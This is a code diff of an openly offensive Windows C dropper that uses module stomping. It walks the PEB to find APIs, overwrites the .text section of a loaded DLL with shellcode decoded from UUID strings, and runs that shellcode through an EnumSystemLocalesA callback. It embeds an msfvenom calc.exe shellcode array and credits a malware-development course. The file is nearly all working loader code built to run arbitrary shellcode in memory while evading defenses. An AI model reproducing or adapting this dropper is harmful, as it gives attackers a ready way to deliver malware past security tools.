@@ -1,5 +1,6 @@
 // Title: Module-Stomping UUID2Shellcode Dropper
 // Author: Bobby Cooke (0xBoku/boku/boku7) // SpiderLabs // https://twitter.com/0xBoku // github.com/boku7 // https://www.linkedin.com/in/bobby-cooke/ // https://0xboku.com
+// Credits / References: Matt Kingstone (@n00bRage), Stephan Borosh (rvrsh3ll|@424f424f)], Reenz0h (@SEKTOR7net), @smelly__vx & @am0nsec, @ajpc500, SecureHat
 // Dropper that loads DLL into memory, changes DLL .TEXT section to RW, decodes shellcode from UUID & writes to DLL .TEXT section, changes DLL .TEXT section back to RX, and uses EnumSystemLocalesA() to jump to shellcode & execute!
 #include <Windows.h>
 #include <Rpc.h>
@@ -43,6 +44,7 @@ typedef struct apis {
     tLoadLibraryA LoadLibraryA;
 }apis;
 
+// Windows Internals structs from ProcessHacker, Sektor7, and github
 typedef struct _PEB_LDR_DATA {
     ULONG      Length;
     BOOL       Initialized;
@@ -98,19 +100,44 @@ typedef struct LDR_DATA_TABLE_ENTRY
 
 int main()
 {
+    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
+    // python3 bin2uuid.py calc.bin
+    // Shellcode as array of UUIDs
+    CHAR* uuids[] =
+    {
+        "e48348fc-e8f0-00c0-0000-415141505251",
+        "d2314856-4865-528b-6048-8b5218488b52",
+        "728b4820-4850-b70f-4a4a-4d31c94831c0",
+        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
+        "48514152-528b-8b20-423c-4801d08b8088",
+        "48000000-c085-6774-4801-d0508b481844",
+        "4920408b-d001-56e3-48ff-c9418b348848",
+        "314dd601-48c9-c031-ac41-c1c90d4101c1",
+        "f175e038-034c-244c-0845-39d175d85844",
+        "4924408b-d001-4166-8b0c-48448b401c49",
+        "8b41d001-8804-0148-d041-5841585e595a",
+        "59415841-5a41-8348-ec20-4152ffe05841",
+        "8b485a59-e912-ff57-ffff-5d48ba010000",
+        "00000000-4800-8d8d-0101-000041ba318b",
+        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
+        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
+        "6a6f7213-5900-8941-daff-d563616c632e",
+        "00657865-9090-9090-9090-909090909090"
+    };
     // Get Base Address of ntdll.dll
     WCHAR * ws_ntdll = L"ntdll.dll";
     Dll ntdll;
     WCHAR* ws_k32 = L"KERNEL32.DLL";
     Dll k32;
+    // Modified method from Sektor7 Malware Dev Course - https://institute.sektor7.net/
     PPEB peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     PPEB_LDR_DATA ldr = peb->Ldr;
     LIST_ENTRY* ModuleList = NULL;
     ModuleList = &ldr->InMemoryOrderModuleList;
     LIST_ENTRY* pStartListEntry = ModuleList->Flink;
 
-    for (LIST_ENTRY* pListEntry = pStartListEntry;  		// start from beginning of InMemoryOrderModuleList
-        pListEntry != ModuleList;	    	// walk all list entries
+    for (LIST_ENTRY* pListEntry = pStartListEntry;  // start from beginning of InMemoryOrderModuleList
+        pListEntry != ModuleList;	               	// walk all list entries
         pListEntry = pListEntry->Flink) {
 
         // get current Data Table Entry
@@ -170,35 +197,10 @@ int main()
     CHAR SleepStr[] = { 'S','l','e','e','p',0 };
     api.Sleep = (tSleep)getSymbolAddress(SleepStr, (PVOID)sizeof(SleepStr), k32.dllBase, k32.Export.AddressTable, k32.Export.NameTable, k32.Export.OrdinalTable);
 
-    // msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin
-    // python3 bin2uuid.py calc.bin
-    // Shellcode as array of UUIDs
-    const char* uuids[] =
-    {
-        "e48348fc-e8f0-00c0-0000-415141505251",
-        "d2314856-4865-528b-6048-8b5218488b52",
-        "728b4820-4850-b70f-4a4a-4d31c94831c0",
-        "7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
-        "48514152-528b-8b20-423c-4801d08b8088",
-        "48000000-c085-6774-4801-d0508b481844",
-        "4920408b-d001-56e3-48ff-c9418b348848",
-        "314dd601-48c9-c031-ac41-c1c90d4101c1",
-        "f175e038-034c-244c-0845-39d175d85844",
-        "4924408b-d001-4166-8b0c-48448b401c49",
-        "8b41d001-8804-0148-d041-5841585e595a",
-        "59415841-5a41-8348-ec20-4152ffe05841",
-        "8b485a59-e912-ff57-ffff-5d48ba010000",
-        "00000000-4800-8d8d-0101-000041ba318b",
-        "d5ff876f-f0bb-a2b5-5641-baa695bd9dff",
-        "c48348d5-3c28-7c06-0a80-fbe07505bb47",
-        "6a6f7213-5900-8941-daff-d563616c632e",
-        "00657865-9090-9090-9090-909090909090"
-    };
-
     HANDLE hProc = -1; // Handle to current process
 
     // Module Stomping - Can be any DLL that has a RX section larger than the shellcode
-    unsigned char sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
+    CHAR sLib[] = { 'w','i','n','d','o','w','s','.','s','t','o','r','a','g','e','.','d','l','l', 0x0 };
     HMODULE hVictimLib = api.LoadLibraryA((LPCSTR)sLib);
 
     // PE & DLL headers are 0x1000 bytes. so DLLBase+0x1000 = .TEXT section of PE/DLL (executable code section)
